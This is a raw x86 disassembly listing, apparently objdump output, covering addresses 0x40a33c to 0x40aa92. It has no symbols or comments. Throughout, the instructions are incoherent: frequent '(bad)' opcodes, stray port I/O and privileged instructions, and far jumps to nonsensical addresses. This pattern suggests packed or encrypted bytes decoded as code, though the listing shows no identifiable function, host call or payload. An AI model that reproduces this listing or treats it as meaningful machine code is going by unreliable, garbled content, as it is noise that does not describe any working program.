  40a33c:	lods   eax,DWORD PTR ds:[esi]
  40a33d:	test   eax,0x1ab35203
  40a342:	cli    
  40a343:	mov    edi,0x57011f7d
  40a348:	jg     0x40a35f
  40a34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a34b:	dec    esp
  40a34c:	and    al,0xdd
  40a34e:	xchg   esp,eax
  40a34f:	int    0x53
  40a351:	sub    cl,BYTE PTR [esi+ebx*8-0x5bab7c7b]
  40a358:	into   
  40a359:	add    al,0xf3
  40a35b:	jmp    0x127217bb
  40a360:	mov    dl,0x82
  40a362:	into   
  40a363:	xor    DWORD PTR [esi+0x979797d],esi
  40a369:	push   ds
  40a36a:	leave  
  40a36b:	and    BYTE PTR [edx],0x93
  40a36e:	daa    
  40a36f:	mov    ebx,0x7d4a6b34
  40a374:	mov    al,0x40
  40a376:	xchg   esi,eax
  40a377:	push   eax
  40a378:	ds in  al,0x68
  40a37b:	dec    ebp
  40a37c:	ror    BYTE PTR [edi+0x36f3596f],1
  40a382:	test   BYTE PTR [edx+0x53],bl
  40a385:	mov    al,ds:0xe2458aed
  40a38a:	cmp    esi,DWORD PTR [ebx-0x7]
  40a38d:	push   0xffffffe4
  40a38f:	add    eax,0x9e8c80a8
  40a394:	fidivr WORD PTR [ecx-0x1b1e4387]
  40a39a:	inc    edi
  40a39b:	test   al,0x38
  40a39d:	inc    esi
  40a39e:	cmc    
  40a39f:	or     DWORD PTR [eax-0x23],ebx
  40a3a2:	push   cs
  40a3a3:	fwait
  40a3a4:	push   ebx
  40a3a5:	pop    ss
  40a3a6:	push   edx
  40a3a7:	outs   dx,DWORD PTR ds:[esi]
  40a3a8:	ins    BYTE PTR es:[edi],dx
  40a3a9:	push   esi
  40a3aa:	dec    esi
  40a3ab:	pop    edx
  40a3ac:	push   ebx
  40a3ad:	jbe    0x40a422
  40a3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b0:	call   0x7c6b:0xfab07aa2
  40a3b7:	adc    edi,DWORD PTR [esi+0x101d76dc]
  40a3bd:	or     eax,DWORD PTR [ebx+0x6a1443cc]
  40a3c3:	sub    BYTE PTR [ebx-0x7b],dl
  40a3c6:	push   ebx
  40a3c7:	jnp    0x40a351
  40a3c9:	dec    esp
  40a3ca:	pop    edi
  40a3cb:	and    DWORD PTR [ecx],ebx
  40a3cd:	imul   ecx,DWORD PTR [ebp-0x11],0xffffffdc
  40a3d1:	(bad)  
  40a3d2:	call   0x66d3fe0e
  40a3d7:	add    BYTE PTR [edi-0x4c],dl
  40a3da:	fdiv   QWORD PTR [edx-0x63de12c9]
  40a3e0:	mov    WORD PTR [ecx-0x35],gs
  40a3e3:	pusha  
  40a3e4:	sbb    cl,dl
  40a3e6:	rcr    edx,1
  40a3e8:	sahf   
  40a3e9:	sbb    esi,DWORD PTR [eax+0x72]
  40a3ec:	push   ebp
  40a3ed:	pop    ebx
  40a3ee:	add    eax,0x9a4d23b0
  40a3f3:	jmp    0x40a420
  40a3f5:	imul   esi,esi,0x28
  40a3f8:	hlt    
  40a3f9:	scas   al,BYTE PTR es:[edi]
  40a3fa:	stc    
  40a3fb:	or     ah,ah
  40a3fd:	cmp    DWORD PTR [ecx+0x29],esi
  40a400:	lahf   
  40a401:	xchg   ebx,eax
  40a402:	and    bl,dh
  40a404:	mov    al,ds:0xa519e3da
  40a409:	sub    BYTE PTR [ecx-0x2c],bh
  40a40c:	fimul  DWORD PTR [edi-0x49c30e0c]
  40a412:	jmp    0x9031f1eb
  40a417:	stos   DWORD PTR es:[edi],eax
  40a418:	sbb    ebp,DWORD PTR [bx+di-0x26]
  40a41c:	jbe    0x40a3e0
  40a41e:	arpl   WORD PTR [esi],sp
  40a420:	add    eax,0xfb9b0028
  40a425:	xchg   esi,eax
  40a426:	or     eax,0x24805c2c
  40a42b:	not    DWORD PTR [ebx-0x27]
  40a42e:	arpl   WORD PTR [edi],bx
  40a430:	xor    DWORD PTR [esi],0x54
  40a433:	sbb    bh,al
  40a435:	cs in  al,0x91
  40a438:	jl     0x40a4aa
  40a43a:	xor    edx,DWORD PTR [ebx+ecx*4]
  40a43d:	dec    esi
  40a43e:	sbb    DWORD PTR ss:[ebp-0x2d],ebx
  40a442:	and    BYTE PTR [edi+eiz*1],bl
  40a445:	xchg   esp,eax
  40a446:	mov    eax,0xe6b3986
  40a44b:	test   eax,0x3ac90372
  40a450:	int3   
  40a451:	mov    esi,0xac53f200
  40a456:	or     DWORD PTR [ecx],eax
  40a458:	mov    esi,0x6dd39df4
  40a45d:	push   0xfffffffa
  40a45f:	add    al,0xc6
  40a461:	inc    ecx
  40a462:	jg     0x40a4c5
  40a464:	cmc    
  40a465:	adc    bh,BYTE PTR [ecx]
  40a467:	je     0x40a4bc
  40a469:	outs   dx,BYTE PTR ds:[esi]
  40a46a:	fisttp QWORD PTR [ecx]
  40a46c:	xchg   edi,eax
  40a46d:	inc    edi
  40a46e:	in     al,dx
  40a46f:	(bad)  
  40a470:	push   eax
  40a471:	dec    edi
  40a472:	int3   
  40a473:	sub    bl,ah
  40a475:	sub    dh,BYTE PTR [edi-0x25]
  40a478:	dec    esi
  40a479:	(bad)  
  40a47a:	dec    ecx
  40a47b:	sub    cl,BYTE PTR [ebx]
  40a47d:	sbb    eax,0xf659b679
  40a482:	clc    
  40a483:	and    al,0x5b
  40a485:	xchg   ebx,eax
  40a486:	rcr    BYTE PTR [ecx],1
  40a488:	psubusw mm5,QWORD PTR [edi+eax*4+0x2cdd79b8]
  40a490:	push   ebp
  40a491:	std    
  40a492:	jae    0x40a4dc
  40a494:	jbe    0x40a4ff
  40a496:	adc    bh,BYTE PTR [edx+0x5]
  40a499:	outs   dx,DWORD PTR ds:[esi]
  40a49a:	cmc    
  40a49b:	sbb    DWORD PTR [ebx-0x35],ebp
  40a49e:	bound  ebx,QWORD PTR [ebx+0x26e8269]
  40a4a4:	xchg   BYTE PTR ds:0x84640122,bl
  40a4aa:	add    cl,bh
  40a4ac:	push   edx
  40a4ad:	mov    eax,ds:0x37b5a3c3
  40a4b2:	es dec ebx
  40a4b4:	int    0x76
  40a4b6:	dec    edx
  40a4b7:	sbb    BYTE PTR [ecx],dh
  40a4b9:	std    
  40a4ba:	xchg   ebp,eax
  40a4bb:	or     ebx,esi
  40a4bd:	push   es
  40a4be:	outs   dx,DWORD PTR ds:[esi]
  40a4bf:	cmp    al,BYTE PTR [ecx+0x4d]
  40a4c2:	jg     0x40a52c
  40a4c4:	xlat   BYTE PTR ds:[ebx]
  40a4c5:	and    BYTE PTR [ebp+ecx*1+0x466b3653],0x8c
  40a4cd:	jne    0x40a510
  40a4cf:	sbb    ah,bl
  40a4d1:	(bad)  
  40a4d2:	jmp    0x5541:0x8a178740
  40a4d9:	lds    edi,FWORD PTR [ecx-0x70]
  40a4dc:	sahf   
  40a4dd:	sub    DWORD PTR [eax+0x5056c430],ebp
  40a4e3:	int3   
  40a4e4:	adc    BYTE PTR [eax+0x62],dl
  40a4e7:	rcl    dl,0x2a
  40a4ea:	dec    esi
  40a4eb:	push   ecx
  40a4ec:	(bad)  
  40a4ed:	(bad)  
  40a4ee:	ins    DWORD PTR es:[edi],dx
  40a4ef:	mov    bh,al
  40a4f1:	and    al,0x65
  40a4f3:	adc    BYTE PTR [eax],dh
  40a4f5:	xchg   edx,eax
  40a4f6:	sti    
  40a4f7:	aaa    
  40a4f8:	xor    al,0xea
  40a4fa:	das    
  40a4fb:	jmp    0x40a4e0
  40a4fd:	sub    al,0xf4
  40a4ff:	cmp    edx,DWORD PTR [ebx+0x5e]
  40a502:	ja     0x40a497
  40a504:	imul   ecx,DWORD PTR [esi],0xffffffad
  40a507:	mov    ecx,0xeb76e753
  40a50c:	push   esp
  40a50d:	adc    eax,0xd3d44667
  40a512:	les    edi,FWORD PTR [edi]
  40a514:	push   ebx
  40a515:	nop
  40a516:	popa   
  40a517:	(bad)  
  40a518:	(bad)  
  40a519:	xchg   esi,eax
  40a51a:	push   ebp
  40a51b:	test   eax,0x7f99bf75
  40a520:	push   ebx
  40a521:	cmp    DWORD PTR [esp+ebp*2-0x62c9a7e6],ebx
  40a528:	pop    es
  40a529:	imul   edx,esi,0x2c
  40a52c:	ja     0x40a599
  40a52e:	or     eax,0x361d981
  40a533:	out    dx,al
  40a534:	mov    edi,0xf93c6633
  40a539:	jp     0x40a4ca
  40a53b:	mov    ch,0xbd
  40a53d:	push   0xffffffea
  40a53f:	int3   
  40a540:	xchg   ebp,eax
  40a541:	mov    al,ds:0xb65e5cda
  40a546:	int    0xca
  40a548:	add    edx,DWORD PTR [ebp+0x471c5f66]
  40a54e:	push   edx
  40a54f:	mov    bh,0xba
  40a551:	xor    dl,BYTE PTR [ebx]
  40a553:	sbb    edx,DWORD PTR [edi]
  40a555:	dec    edi
  40a556:	push   0x2171fd9d
  40a55b:	rcl    DWORD PTR [ebx-0x10],cl
  40a55e:	out    0x28,al
  40a560:	pop    ecx
  40a561:	or     al,0x47
  40a563:	xor    DWORD PTR [esi+ecx*2+0x2bbdd7de],ebx
  40a56a:	mov    ds:0x8dd919cc,eax
  40a56f:	std    
  40a570:	imul   ebx,DWORD PTR [edi+0x66],0xffffff8d
  40a574:	fnstsw WORD PTR [edi+eax*2+0x186b5455]
  40a57b:	sbb    esi,DWORD PTR [eax]
  40a57d:	dec    ebp
  40a57e:	bound  eax,QWORD PTR [edi]
  40a580:	mov    dh,0x8d
  40a582:	mov    al,ds:0x98205357
  40a587:	ror    cl,0xca
  40a58a:	(bad)  
  40a58b:	int    0x7d
  40a58d:	imul   ebx,esi,0x810b756e
  40a593:	push   eax
  40a594:	xor    al,0xd7
  40a596:	data16 ss mov ch,0xed
  40a59a:	inc    esi
  40a59b:	repnz jmp 0x3c41:0xdb19e1ef
  40a5a3:	adc    edi,DWORD PTR [ecx-0x7af7c44a]
  40a5a9:	and    al,0x85
  40a5ab:	cdq    
  40a5ac:	pop    edx
  40a5ad:	shr    DWORD PTR [esi-0xdbd26dd],1
  40a5b3:	cmc    
  40a5b4:	mov    ds:0x67d0300e,eax
  40a5b9:	sbb    BYTE PTR [ebp+0x5f4e5ba9],dh
  40a5bf:	fcom   DWORD PTR [ebx-0x65]
  40a5c2:	daa    
  40a5c3:	icebp  
  40a5c4:	mov    WORD PTR [ebx],?
  40a5c6:	xchg   ebp,eax
  40a5c7:	and    DWORD PTR [ebp+0x53489e0d],edx
  40a5cd:	hlt    
  40a5ce:	cmp    esp,ecx
  40a5d0:	adc    DWORD PTR [esi+0x2e53f4ec],esp
  40a5d6:	jnp    0x40a59f
  40a5d8:	mov    ch,0x26
  40a5da:	dec    ebx
  40a5db:	out    dx,al
  40a5dc:	cs push es
  40a5de:	ds mov eax,0xeb26ed84
  40a5e4:	fcmovne st,st(1)
  40a5e6:	mov    ebx,cs
  40a5e8:	push   ecx
  40a5e9:	in     al,0x8b
  40a5eb:	xor    eax,0x59f06ec9
  40a5f0:	jecxz  0x40a5c8
  40a5f2:	mov    ah,0x19
  40a5f4:	pop    ebp
  40a5f5:	push   ds
  40a5f6:	out    0x21,eax
  40a5f8:	and    DWORD PTR [edx+edx*1+0x7],0x53
  40a5fd:	pop    esp
  40a5fe:	fs and al,0x5b
  40a601:	(bad)
  40a604:	push   es
  40a605:	imul   esi,esp,0xffffffcc
  40a608:	int    0x8c
  40a60a:	sub    al,0x45
  40a60c:	xor    ebp,DWORD PTR [ecx+0x66]
  40a60f:	cmp    ebx,edi
  40a611:	push   ss
  40a612:	sub    BYTE PTR [eax+eax*8],bh
  40a615:	test   ebp,0xc207cc86
  40a61b:	inc    ebx
  40a61c:	xor    eax,0x3b19ab96
  40a621:	aad    0x2
  40a623:	ret    
  40a624:	mov    eax,0xc386669c
  40a629:	xchg   edx,eax
  40a62a:	dec    edi
  40a62b:	mov    ds:0xab8336a3,eax
  40a630:	aam    0x38
  40a632:	test   DWORD PTR [edi+0x53],0x152e74e8
  40a639:	cmp    ebp,DWORD PTR [ebx]
  40a63b:	mov    dl,0x2
  40a63d:	jmp    0x40a670
  40a63f:	loopne 0x40a5d2
  40a641:	out    0x51,eax
  40a643:	fld    QWORD PTR [ecx+0x6a]
  40a646:	sub    al,0x39
  40a648:	stos   BYTE PTR es:[edi],al
  40a649:	pop    ds
  40a64a:	xchg   edx,eax
  40a64b:	(bad)  
  40a64c:	xor    BYTE PTR ds:0xdaef7d79,bl
  40a652:	add    edi,DWORD PTR [eax+0x79]
  40a655:	or     ecx,esp
  40a657:	sbb    DWORD PTR [ebp+0x4d],edi
  40a65a:	enter  0x315,0xf9
  40a65e:	js     0x40a65c
  40a660:	xchg   edi,eax
  40a661:	mov    ch,0x1
  40a663:	sbb    ebp,DWORD PTR [edi-0x5a]
  40a666:	dec    ecx
  40a667:	fwait
  40a668:	or     ch,cl
  40a66a:	jnp    0x40a608
  40a66c:	lock add eax,0x58efad68
  40a672:	jne    0x40a636
  40a674:	adc    eax,DWORD PTR [ecx+0x6cc7dc53]
  40a67a:	gs std 
  40a67c:	pop    ecx
  40a67d:	or     DWORD PTR [ecx-0x1c7bcdf2],ebx
  40a683:	add    al,0x73
  40a685:	sti    
  40a686:	daa    
  40a687:	ror    DWORD PTR [eax-0x2f],0x66
  40a68b:	jo     0x40a65c
  40a68d:	fimul  WORD PTR [edi+ebx*2]
  40a690:	inc    edx
  40a691:	daa    
  40a692:	sbb    BYTE PTR [ecx-0x1cd96c08],bl
  40a698:	mov    esp,0x4ca03398
  40a69d:	imul   edx,DWORD PTR [esp+ebx*2],0x691a8c67
  40a6a4:	add    al,0x19
  40a6a6:	jns    0x40a681
  40a6a8:	mov    bh,0x4d
  40a6aa:	xchg   edx,eax
  40a6ab:	xor    eax,0x1850883d
  40a6b0:	(bad)  
  40a6b1:	add    ebx,DWORD PTR [eax-0x1924780]
  40a6b7:	pop    ecx
  40a6b8:	push   ebx
  40a6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6ba:	mov    dh,0xe3
  40a6bc:	or     eax,0x44815463
  40a6c1:	push   0xffffffcf
  40a6c3:	mov    ch,0x2
  40a6c5:	icebp  
  40a6c6:	fcomi  st,st(4)
  40a6c8:	stos   BYTE PTR es:[edi],al
  40a6c9:	pop    edi
  40a6ca:	ucomisd xmm5,QWORD PTR [edx+ecx*4]
  40a6cf:	mov    edx,0xcde72755
  40a6d4:	(bad)  
  40a6d5:	clc    
  40a6d6:	out    dx,al
  40a6d7:	rcl    BYTE PTR [ecx-0x51c9f723],1
  40a6dd:	jmp    0x4c1cff5a
  40a6e2:	jns    0x40a6a9
  40a6e4:	in     eax,dx
  40a6e5:	outs   dx,DWORD PTR ds:[esi]
  40a6e6:	fdiv   DWORD PTR [ebp-0x2fd79db9]
  40a6ec:	ja     0x40a676
  40a6ee:	jne    0x40a749
  40a6f0:	jbe    0x40a6eb
  40a6f2:	sahf   
  40a6f3:	xchg   edi,eax
  40a6f4:	sub    ebx,DWORD PTR [esi-0x168604d3]
  40a6fa:	shl    DWORD PTR [edi+0x2a],0x7a
  40a6fe:	es js  0x40a6f6
  40a701:	cs push edx
  40a703:	(bad)  
  40a705:	mov    cl,0x94
  40a707:	mov    eax,0x1f3919b4
  40a70c:	xor    BYTE PTR [ebx-0x79],ah
  40a70f:	dec    edi
  40a710:	jmp    0x40a6e4
  40a712:	data16 arpl bp,ax
  40a715:	mov    dl,0x7d
  40a717:	add    al,0xbb
  40a719:	dec    ecx
  40a71a:	push   ecx
  40a71b:	shl    ch,0xed
  40a71e:	jno    0x40a6eb
  40a720:	add    ecx,DWORD PTR [esi]
  40a722:	ret    
  40a723:	fstp   DWORD PTR [edi+0x4c6a432e]
  40a729:	jmp    0x40a702
  40a72b:	pop    eax
  40a72c:	mov    BYTE PTR [eax-0x77],dh
  40a72f:	ds addr16 pusha 
  40a732:	popa   
  40a733:	(bad)  
  40a735:	mov    gs,esp
  40a737:	and    DWORD PTR [edx+0x2],ecx
  40a73a:	cwde   
  40a73b:	jmp    0x4caac95f
  40a740:	push   ebx
  40a741:	je     0x40a7bf
  40a743:	cmp    eax,0x60b871b4
  40a748:	loop   0x40a74b
  40a74a:	xor    cl,BYTE PTR [edx-0x57b3ba6a]
  40a750:	mov    ebp,DWORD PTR ds:[edx]
  40a753:	mov    ebx,DWORD PTR [ebp+0x53]
  40a756:	xor    bl,BYTE PTR [ebx-0x369614ad]
  40a75c:	repnz mov DWORD PTR [edx],edi
  40a75f:	sub    DWORD PTR [esi-0x3ee63507],ecx
  40a765:	mov    ecx,0x584a674c
  40a76a:	int3   
  40a76b:	xor    DWORD PTR [ebx+0x4],edx
  40a76e:	bsr    esp,esp
  40a771:	setno  BYTE PTR [ecx+0x40b33239]
  40a778:	push   ebx
  40a779:	jge    0x40a72c
  40a77b:	fiadd  WORD PTR [eax]
  40a77d:	or     BYTE PTR [ebx],bh
  40a77f:	test   eax,0x94b46353
  40a784:	or     eax,0xd1d7007e
  40a789:	push   0xffffffb9
  40a78b:	pushf  
  40a78c:	xor    eax,0xbf90a2e1
  40a791:	xchg   ebx,eax
  40a792:	cmp    dh,bl
  40a794:	test   BYTE PTR ds:0x36d4224e,0xd7
  40a79b:	ds enter 0xb2df,0x7c
  40a7a0:	inc    ecx
  40a7a1:	data16 mov al,ds:0x66293459
  40a7a7:	push   esp
  40a7a8:	stc    
  40a7a9:	adc    eax,0x59a58fc7
  40a7ae:	inc    esi
  40a7af:	pop    ebp
  40a7b0:	shl    DWORD PTR [edi-0x1d514c87],0xbb
  40a7b7:	pop    esp
  40a7b8:	cld    
  40a7b9:	test   eax,0x69518684
  40a7be:	push   0x9880b8f7
  40a7c3:	pop    ds
  40a7c4:	test   ch,0x66
  40a7c7:	inc    ebp
  40a7c8:	ror    edi,1
  40a7ca:	inc    eax
  40a7cb:	ror    DWORD PTR [esi-0x64],cl
  40a7ce:	ficomp DWORD PTR [ecx]
  40a7d0:	cld    
  40a7d1:	shl    eax,cl
  40a7d3:	jno    0x40a7ac
  40a7d5:	pop    ds
  40a7d6:	and    ch,BYTE PTR [eax]
  40a7d8:	push   ebx
  40a7d9:	jns    0x40a7db
  40a7db:	cmp    DWORD PTR [ebp-0x5a],0xffffff8d
  40a7df:	push   es
  40a7e0:	popa   
  40a7e1:	imul   ebx,DWORD PTR [ebp+0x13ef1e84],0x66f2512e
  40a7eb:	sub    eax,0x2f2cac28
  40a7f0:	mov    dh,0xa7
  40a7f2:	out    dx,al
  40a7f3:	sbb    DWORD PTR [eax-0x3e],edi
  40a7f6:	lea    edx,[edx+0x65912b82]
  40a7fc:	stos   DWORD PTR es:[edi],eax
  40a7fd:	(bad)  
  40a7fe:	fstp   TBYTE PTR [ebx+0x7bc8cbf7]
  40a804:	pop    eax
  40a805:	test   eax,0x6d331c6a
  40a80a:	mov    cl,0x19
  40a80c:	xrstors [eiz*2+0x147153ec]
  40a814:	xchg   BYTE PTR [edi-0x400a6606],dl
  40a81a:	pop    ebp
  40a81b:	lods   al,BYTE PTR ds:[esi]
  40a81c:	test   al,bl
  40a81e:	mov    edi,0x92b1fc19
  40a823:	es mov ecx,0x5dcc50b2
  40a829:	dec    ebx
  40a82a:	fsub   QWORD PTR [edx+0x4f]
  40a82d:	popf   
  40a82e:	sbb    eax,DWORD PTR [ebx+0x5ec6c013]
  40a834:	adc    ch,BYTE PTR [ebx-0x80]
  40a837:	xchg   esp,eax
  40a838:	xchg   DWORD PTR [ecx+ebx*2],ecx
  40a83b:	pop    ecx
  40a83c:	mov    esi,0x99876642
  40a841:	mov    bh,0x96
  40a843:	push   ds
  40a844:	mov    al,ds:0xac199fbb
  40a849:	dec    edi
  40a84a:	fs stos DWORD PTR es:[edi],eax
  40a84c:	inc    edx
  40a84d:	fdivp  st(0),st
  40a84f:	stc    
  40a850:	push   ebx
  40a851:	(bad)  
  40a853:	not    DWORD PTR [ecx+0x3c]
  40a856:	jnp    0x40a856
  40a858:	jle    0x40a8c4
  40a85a:	pop    ebp
  40a85b:	jo     0x40a8a6
  40a85d:	mov    ecx,0xba5ce8df
  40a862:	in     al,0x35
  40a864:	dec    esi
  40a865:	jbe    0x40a8af
  40a867:	mov    bh,0xd9
  40a869:	ins    DWORD PTR es:[edi],dx
  40a86a:	xor    eax,0x16c336d9
  40a86f:	xor    BYTE PTR [ebx+0x6b],dh
  40a872:	or     dl,BYTE PTR ds:0x3296355d
  40a878:	xor    ebx,esp
  40a87a:	mov    ds:0x754a5329,al
  40a87f:	aam    0x92
  40a881:	aad    0x55
  40a883:	mov    BYTE PTR [ebx+0x5b56996a],bh
  40a889:	push   0x8ddb5ceb
  40a88e:	jns    0x40a860
  40a890:	push   ds
  40a891:	sti    
  40a892:	xchg   edi,eax
  40a893:	mov    bh,0x88
  40a895:	inc    esp
  40a896:	loop   0x40a8b1
  40a898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a899:	aaa    
  40a89a:	cmp    eax,0x6062c574
  40a89f:	lds    edx,FWORD PTR [ecx-0x59]
  40a8a2:	pop    es
  40a8a3:	mov    dh,0xa6
  40a8a5:	sub    edi,esi
  40a8a7:	pop    ecx
  40a8a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a9:	fnstcw WORD PTR [edi+0x1b]
  40a8ac:	cmp    edi,DWORD PTR ds:0xcc82ab0e
  40a8b2:	lock sub ch,BYTE PTR [edi-0x25]
  40a8b6:	test   al,0xae
  40a8b8:	push   ebx
  40a8b9:	inc    ecx
  40a8ba:	sub    DWORD PTR [edi+eiz*1],ebp
  40a8bd:	dec    ebp
  40a8be:	inc    edx
  40a8bf:	int3   
  40a8c0:	int3   
  40a8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c2:	mov    cl,0x19
  40a8c4:	mov    ebp,0x38bb2f62
  40a8c9:	cwde   
  40a8ca:	or     ch,BYTE PTR [ebx+0x41]
  40a8cd:	sub    ah,BYTE PTR [esi]
  40a8cf:	add    BYTE PTR [edx+ebp*2+0x6ac1995a],bl
  40a8d6:	mov    bh,0x5d
  40a8d8:	jne    0x40a8d1
  40a8da:	xchg   esp,eax
  40a8db:	jle    0x40a871
  40a8dd:	(bad)  
  40a8de:	data16 outs dx,BYTE PTR es:[esi]
  40a8e1:	push   eax
  40a8e2:	or     BYTE PTR [ebx],dl
  40a8e4:	in     al,dx
  40a8e5:	ficom  DWORD PTR [esi]
  40a8e7:	pop    ebx
  40a8e8:	add    eax,0xe7daa596
  40a8ed:	push   ebp
  40a8ee:	jge    0x40a922
  40a8f0:	add    eax,0x73984f8b
  40a8f5:	fwait
  40a8f6:	mov    ds:0xba6b2482,al
  40a8fb:	or     ecx,DWORD PTR [ebx+0x59]
  40a8fe:	pop    ds
  40a8ff:	inc    esp
  40a900:	fisub  WORD PTR [esi-0x318fece5]
  40a906:	mov    edx,DWORD PTR [edi-0x2811efed]
  40a90c:	dec    ebp
  40a90d:	cmp    BYTE PTR [edi],dl
  40a90f:	dec    ebx
  40a910:	retf   0xba6a
  40a913:	daa    
  40a914:	mov    gs,WORD PTR [eax+0x60350a00]
  40a91a:	jns    0x40a91c
  40a91c:	or     al,0xbd
  40a91e:	ret    
  40a91f:	in     al,dx
  40a920:	fcmovnu st,st(3)
  40a922:	xchg   ecx,eax
  40a923:	sbb    DWORD PTR [ecx],eax
  40a925:	and    esi,DWORD PTR [edi+0x31632550]
  40a92b:	in     eax,dx
  40a92c:	push   ebx
  40a92d:	lock gs hlt 
  40a930:	adc    eax,0x8439e5d0
  40a935:	sbb    edi,ecx
  40a937:	daa    
  40a938:	enter  0x496a,0x72
  40a93c:	xor    eax,0x52fe503f
  40a941:	sub    eax,eax
  40a943:	sub    DWORD PTR [eax],ecx
  40a945:	xor    eax,0xe027c74b
  40a94a:	jge    0x40a967
  40a94c:	outs   dx,DWORD PTR ds:[esi]
  40a94d:	retf   
  40a94e:	jg     0x40a914
  40a950:	adc    DWORD PTR [edx-0x677ac563],ecx
  40a956:	add    DWORD PTR [ebx],ebx
  40a958:	das    
  40a959:	jne    0x40a97b
  40a95b:	ficom  WORD PTR [ebx]
  40a95d:	sahf   
  40a95e:	xlat   BYTE PTR ds:[ebx]
  40a95f:	leave  
  40a960:	daa    
  40a961:	sbb    BYTE PTR [edx],bl
  40a963:	xor    edi,eax
  40a965:	adc    dh,BYTE PTR [ecx-0x60]
  40a968:	shl    BYTE PTR [ebp+0x7bb3a0a7],0xa5
  40a96f:	push   eax
  40a970:	into   
  40a971:	jne    0x40a9aa
  40a973:	das    
  40a974:	iret   
  40a975:	push   0xffffffbb
  40a977:	add    al,0xb5
  40a979:	inc    ebp
  40a97a:	iret   
  40a97b:	push   ecx
  40a97c:	dec    esi
  40a97d:	fistp  DWORD PTR cs:[edi]
  40a980:	xor    BYTE PTR [esi-0x47],0xe9
  40a984:	sbb    al,BYTE PTR [edx]
  40a986:	xchg   esi,eax
  40a987:	stos   DWORD PTR es:[edi],eax
  40a988:	pop    eax
  40a989:	xor    edx,ebx
  40a98b:	pop    edi
  40a98c:	rcr    edi,cl
  40a98e:	aaa    
  40a98f:	mov    al,0x26
  40a991:	popa   
  40a992:	jnp    0x40a9fb
  40a994:	jo     0x40a91d
  40a996:	outs   dx,DWORD PTR ds:[esi]
  40a997:	clc    
  40a998:	not    DWORD PTR [edx+0x16]
  40a99b:	test   DWORD PTR [ebx],esi
  40a99d:	ins    BYTE PTR es:[edi],dx
  40a99e:	inc    ecx
  40a99f:	scas   eax,DWORD PTR es:[edi]
  40a9a0:	scas   eax,DWORD PTR es:[edi]
  40a9a1:	mov    BYTE PTR [esp+ebx*1+0x441d8ef3],ah
  40a9a8:	push   esp
  40a9a9:	add    DWORD PTR [edi+ebx*8],0xb1662edd
  40a9b0:	inc    esi
  40a9b1:	div    BYTE PTR [edi-0x2894f439]
  40a9b7:	dec    edx
  40a9b8:	ss in  eax,dx
  40a9ba:	hlt    
  40a9bb:	cmp    BYTE PTR [edx],0xc0
  40a9be:	outs   dx,BYTE PTR ds:[esi]
  40a9bf:	inc    esi
  40a9c0:	push   edx
  40a9c1:	mov    bl,0x59
  40a9c3:	jecxz  0x40a96e
  40a9c5:	push   ss
  40a9c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c7:	xor    DWORD PTR [esi],edx
  40a9c9:	sub    al,0xc6
  40a9cb:	pusha  
  40a9cc:	cmp    al,0x6a
  40a9ce:	xchg   ebx,eax
  40a9cf:	xlat   BYTE PTR ds:[ebx]
  40a9d0:	popa   
  40a9d1:	fsubrp st(7),st
  40a9d3:	jnp    0x40a9dd
  40a9d5:	xor    BYTE PTR [esi+0x27],ah
  40a9d8:	cdq    
  40a9d9:	call   FWORD PTR [ecx-0xc]
  40a9dc:	fadd   DWORD PTR [edi]
  40a9de:	gs sbb ebp,ecx
  40a9e1:	xchg   DWORD PTR [edi+0x1fa2ba8c],eax
  40a9e7:	cmp    eax,0x9e1e5953
  40a9ec:	mov    al,0xd6
  40a9ee:	dec    eax
  40a9ef:	mov    dl,0xf9
  40a9f1:	push   0x64
  40a9f3:	arpl   WORD PTR [edx-0x1b975fad],si
  40a9f9:	push   ebp
  40a9fa:	pop    si
  40a9fc:	mov    ecx,0x732ad1a0
  40aa01:	arpl   WORD PTR [ebp-0xfee77e7],ax
  40aa07:	fld    TBYTE PTR [esi+0x4c0605c3]
  40aa0d:	jo     0x40aa65
  40aa0f:	loopne 0x40aa6b
  40aa11:	xchg   BYTE PTR [esi+0x78ec4cfb],dh
  40aa17:	mov    edx,0x180013d3
  40aa1c:	ror    BYTE PTR [ecx+0x13279763],0xf9
  40aa23:	pop    eax
  40aa24:	push   ebx
  40aa25:	ret    
  40aa26:	mov    edx,0x16cf0bb
  40aa2b:	mov    bl,0xe3
  40aa2d:	stos   BYTE PTR es:[edi],al
  40aa2e:	dec    edi
  40aa2f:	jecxz  0x40a9f8
  40aa31:	add    dh,BYTE PTR [eax]
  40aa33:	cmp    BYTE PTR [edi-0x305f2331],al
  40aa39:	jb     0x40aab4
  40aa3b:	mov    eax,ds:0x8c5e3a50
  40aa40:	pusha  
  40aa41:	sbb    al,0x49
  40aa43:	std    
  40aa44:	pop    ebp
  40aa45:	dec    ebx
  40aa46:	stc    
  40aa47:	mov    bl,0x8d
  40aa49:	repz out 0x27,eax
  40aa4c:	push   ebx
  40aa4d:	lock in al,dx
  40aa4f:	push   esp
  40aa50:	add    dl,bh
  40aa52:	sahf   
  40aa53:	mov    esp,0x48922c7e
  40aa58:	push   edx
  40aa59:	std    
  40aa5a:	scas   eax,DWORD PTR es:[edi]
  40aa5b:	pop    edi
  40aa5c:	xchg   esp,eax
  40aa5d:	push   eax
  40aa5e:	cld    
  40aa5f:	loope  0x40aa00
  40aa61:	imul   edi,DWORD PTR [ecx+0x21],0xffffff82
  40aa65:	add    DWORD PTR [edi],0xaa350d9e
  40aa6b:	sar    BYTE PTR [ebx],cl
  40aa6d:	dec    edi
  40aa6e:	repnz out 0xd6,al
  40aa71:	stos   BYTE PTR es:[edi],al
  40aa72:	ret    
  40aa73:	add    ecx,edi
  40aa75:	push   ss
  40aa76:	addr16 xchg edx,eax
  40aa78:	fdiv   st(5),st
  40aa7a:	mov    al,0xa6
  40aa7c:	mov    ebx,DWORD PTR [ecx]
  40aa7e:	mov    ch,0x1a
  40aa80:	imul   ebx,DWORD PTR gs:[ebx],0x6ae60f00
  40aa87:	mov    al,0x20
  40aa89:	xlat   BYTE PTR ds:[ebx]
  40aa8a:	jno    0x40aae1
  40aa8c:	inc    ebp
  40aa8d:	inc    eax
  40aa8e:	pop    es
  40aa8f:	pop    eax
  40aa90:	mov    bl,0xc7
  40aa92:	or     cl,0xac
